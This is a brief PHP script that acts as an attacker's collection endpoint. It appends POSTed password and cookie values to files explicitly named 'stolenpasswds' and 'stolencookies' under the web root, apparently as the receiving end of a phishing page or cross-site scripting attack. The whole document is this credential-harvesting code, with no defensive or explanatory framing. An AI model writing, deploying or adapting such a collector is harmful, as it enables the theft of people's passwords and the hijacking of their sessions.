<?php

    $f = fopen("/var/www/stolenpasswds", "a+");
    fwrite($f, $_POST['passwd'] . "\n");
    fclose($f);

    $f = fopen("/var/www/stolencookies", "a+");
    fwrite($f, $_POST['cookie'] . "\n");
    fclose($f);
    
?>
